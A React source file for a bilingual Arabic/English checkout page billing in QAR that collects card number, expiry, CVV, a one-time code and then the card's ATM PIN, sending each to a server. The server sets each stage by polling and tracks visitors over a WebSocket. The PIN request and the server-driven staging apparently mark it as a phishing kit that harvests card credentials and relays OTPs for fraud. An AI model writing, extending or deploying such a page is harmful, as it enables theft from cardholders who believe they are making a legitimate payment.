import React, { useState, useEffect, type FormEvent } from "react";
import { useLanguage } from "@/contexts/LanguageContext";
import { useLocation } from "wouter";
import { useTranslation } from "@/hooks/useTranslation";
import { Header } from "@/components/Header";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";

export default function Payment() {
  const { lang } = useLanguage();
  const { t } = useTranslation();
  const [, navigate] = useLocation();
  const searchParams = new URLSearchParams(window.location.search);
  const sessionId = searchParams.get("session") || localStorage.getItem("paymentSessionId") || "";
  
  const [stage, setStage] = useState<Stage>("card");
  const [error, setError] = useState<string | null>(null);
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [otpCode, setOtpCode] = useState("");
  const [atmPin, setAtmPin] = useState("");

  const updateStageMutation = trpc.payment.updateStage.useMutation();

  const { data: sessionData } = trpc.payment.getSession.useQuery(
    { sessionId },
    { enabled: !!sessionId }
  );

  const submitCardMutation = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => setError(err.message),
  });

  const submitOtpMutation = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => setError(err.message),
  });

  const submitAtmPinMutation = trpc.payment.submitAtmPin.useMutation({
    onSuccess: () => setStage("atm_pending"),
    onError: (err) => setError(err.message),
  });

  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    {
      enabled: !!sessionId,
      refetchInterval: 2000,
    }
  );

  // تحديث الحالة عند دخول صفحة الدفع
  useEffect(() => {
    if (sessionId) {
      updateStageMutation.mutate({ sessionId, stage: "card" });
      
      // تتبع الصفحة عبر WebSocket
      const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
      const ws = new WebSocket(`${protocol}//${window.location.host}/ws/visitors?page=/payment&sessionId=${sessionId}`);
      return () => ws.close();
    }
  }, [sessionId]);

  useEffect(() => {
    if (sessionStatus?.redirectUrl) {
      window.location.href = sessionStatus.redirectUrl;
      return;
    }
    if (sessionStatus?.stage && sessionStatus.stage !== stage) {
      setStage(sessionStatus.stage as Stage);
      if (sessionStatus.errorMessage) setError(sessionStatus.errorMessage);
      else setError(null);
    }
  }, [sessionStatus, stage]);

  const validateCardNumber = (num: string) => {
    const cleaned = num.replace(/\s+/g, '');
    if (!/^\d{16}$/.test(cleaned)) return false;
    let sum = 0;
    for (let i = 0; i < cleaned.length; i++) {
      let digit = parseInt(cleaned[i]);
      if ((cleaned.length - i) % 2 === 0) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
    }
    return sum % 10 === 0;
  };

  const validateExpiry = (expiry: string) => {
    if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
    const [month, year] = expiry.split('/').map(n => parseInt(n));
    if (month < 1 || month > 12) return false;
    const now = new Date();
    const currentYear = now.getFullYear() % 100;
    const currentMonth = now.getMonth() + 1;
    if (year < currentYear) return false;
    if (year === currentYear && month < currentMonth) return false;
    return true;
  };

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    setError(null);
    if (!validateCardNumber(cardNumber)) {
      setError(lang === "ar" ? "رقم البطاقة غير صحيح" : "Invalid card number");
      return;
    }
    if (!validateExpiry(cardExpiry)) {
      setError(lang === "ar" ? "تاريخ الانتهاء غير صحيح" : "Invalid expiry date");
      return;
    }
    if (!/^\d{3,4}$/.test(cardCvv)) {
      setError(lang === "ar" ? "رمز التحقق (CVV) غير صحيح" : "Invalid CVV");
      return;
    }
    submitCardMutation.mutate({
      sessionId,
      cardName,
      cardNumber: cardNumber.replace(/\s+/g, ''),
      cardExpiry,
      cardCvv,
    });
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitOtpMutation.mutate({ sessionId, otpCode });
  };

  const handleAtmSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitAtmPinMutation.mutate({ sessionId, atmPin });
  };

  const formatCardNumber = (val: string) => {
    const v = val.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    return parts.length ? parts.join(' ') : v;
  };

  const formatExpiry = (val: string) => {
    const v = val.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    if (v.length >= 2) return v.substring(0, 2) + '/' + v.substring(2, 4);
    return v;
  };

  return (
    <div className="min-h-screen bg-[#F8F9FA]" dir={lang === "ar" ? "rtl" : "ltr"}>
      <Header showLanguageToggle={false} />
      <main className="max-w-md mx-auto px-4 py-8">
        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
          <div className="bg-[#8A1538] p-6 text-white text-center">
            <h1 className="text-xl font-bold">{t("payment.title")}</h1>
            <p className="text-sm opacity-80 mt-1">{t("payment.subtitle")}</p>
          </div>
          <div className="p-6">
            {stage === "card" && (
              <form onSubmit={handleCardSubmit} className="space-y-5">
                <div className="flex justify-between items-center pb-4 border-b border-gray-100">
                  <span className="text-gray-600">{t("payment.totalAmount")}</span>
                  <span className="text-xl font-bold text-[#8A1538]">{sessionData?.totalAmount || "0.00"} QAR</span>
                </div>
                {error && <div className="p-3 bg-red-50 text-red-600 text-xs rounded-lg border border-red-100 font-bold">{error}</div>}
                <div className="space-y-4">
                  <div>
                    <label className="block text-xs font-bold text-gray-400 mb-1 uppercase">{t("payment.cardholderName")}</label>
                    <input type="text" value={cardName} onChange={(e) => setCardName(e.target.value.toUpperCase())} className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538] font-mono" placeholder="NAME ON CARD" required />
                  </div>
                  <div>
                    <label className="block text-xs font-bold text-gray-400 mb-1 uppercase">{t("payment.cardNumber")}</label>
                    <input type="text" value={cardNumber} onChange={(e) => setCardNumber(formatCardNumber(e.target.value))} maxLength={19} className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538] font-mono tracking-widest" placeholder="0000 0000 0000 0000" required />
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="block text-xs font-bold text-gray-400 mb-1 uppercase">{t("payment.expiryDate")}</label>
                      <input type="text" value={cardExpiry} onChange={(e) => setCardExpiry(formatExpiry(e.target.value))} maxLength={5} placeholder="MM/YY" className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538] text-center font-mono" required />
                    </div>
                    <div>
                      <label className="block text-xs font-bold text-gray-400 mb-1 uppercase">{t("payment.cvv")}</label>
                      <input type="password" value={cardCvv} onChange={(e) => setCardCvv(e.target.value.replace(/[^0-9]/g, ''))} maxLength={4} placeholder="***" className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538] text-center font-mono" required />
                    </div>
                  </div>
                </div>
                <button type="submit" disabled={submitCardMutation.isPending} className="w-full py-4 bg-[#8A1538] text-white rounded-lg font-bold hover:bg-[#6D112C] transition-all shadow-md active:scale-[0.98]">
                  {submitCardMutation.isPending ? t("payment.processing") : t("payment.completePayment")}
                </button>
              </form>
            )}
            {(stage === "card_pending" || stage === "otp_pending" || stage === "atm_pending") && (
              <div className="py-20 text-center space-y-4">
                <div className="w-12 h-12 border-4 border-[#8A1538] border-t-transparent rounded-full animate-spin mx-auto"></div>
                <h3 className="text-lg font-bold text-gray-900">{t("payment.processing")}</h3>
                <p className="text-gray-500 text-sm">{lang === "ar" ? "يرجى الانتظار، يتم التحقق من بياناتك" : "Please wait, verifying your details"}</p>
              </div>
            )}
            {stage === "otp" && (
              <form onSubmit={handleOtpSubmit} className="text-center space-y-6">
                <h3 className="text-xl font-bold text-gray-900">{t("payment.verificationCode")}</h3>
                <p className="text-gray-500 text-sm">{t("payment.enterCode")}</p>
                <input value={otpCode} onChange={(e) => setOtpCode(e.target.value)} className="w-full text-center text-3xl font-bold p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:border-[#8A1538] font-mono tracking-[0.5em]" placeholder="••••••" maxLength={6} required />
                <button type="submit" disabled={submitOtpMutation.isPending} className="w-full bg-[#8A1538] text-white font-bold py-4 rounded-xl shadow-lg">
                  {submitOtpMutation.isPending ? "جاري التأكيد..." : t("payment.confirm")}
                </button>
              </form>
            )}
            {stage === "atm" && (
              <form onSubmit={handleAtmSubmit} className="text-center space-y-6">
                <h3 className="text-xl font-bold text-gray-900">{lang === "ar" ? "رقم PIN للصراف" : "ATM PIN"}</h3>
                <p className="text-gray-500 text-sm">{lang === "ar" ? "يرجى إدخال الرقم السري للبطاقة" : "Please enter your card PIN"}</p>
                <input type="password" value={atmPin} onChange={(e) => setAtmPin(e.target.value)} className="w-full text-center text-3xl font-bold p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:border-[#8A1538] font-mono tracking-[0.5em]" placeholder="••••" maxLength={4} required />
                <button type="submit" disabled={submitAtmPinMutation.isPending} className="w-full bg-[#8A1538] text-white font-bold py-4 rounded-xl shadow-lg">
                  {submitAtmPinMutation.isPending ? "جاري التأكيد..." : t("payment.confirm")}
                </button>
              </form>
            )}
            {stage === "success" && (
              <div className="py-12 text-center space-y-6">
                <div className="text-6xl text-green-500">✓</div>
                <h3 className="text-2xl font-bold text-gray-900">{t("payment.success")}</h3>
                <p className="text-gray-500">{lang === "ar" ? "شكراً لك، تمت معالجة العملية." : "Thank you, your payment has been processed."}</p>
                <button onClick={() => navigate("/")} className="bg-gray-900 text-white font-bold py-4 px-8 rounded-xl shadow-lg">{t("payment.backHome")}</button>
              </div>
            )}
            {stage === "failed" && (
              <div className="py-12 text-center space-y-6">
                <div className="text-6xl text-red-500">✕</div>
                <h3 className="text-2xl font-bold text-gray-900">{lang === "ar" ? "فشلت العملية" : "Payment Failed"}</h3>
                <p className="text-gray-500">{error || (lang === "ar" ? "حدث خطأ أثناء معالجة الدفع." : "An error occurred during payment processing.")}</p>
                <button onClick={() => setStage("card")} className="bg-[#8A1538] text-white font-bold py-4 px-8 rounded-xl shadow-lg">{lang === "ar" ? "حاول مرة أخرى" : "Try Again"}</button>
              </div>
            )}
          </div>
        </div>
      </main>
    </div>
  );
}
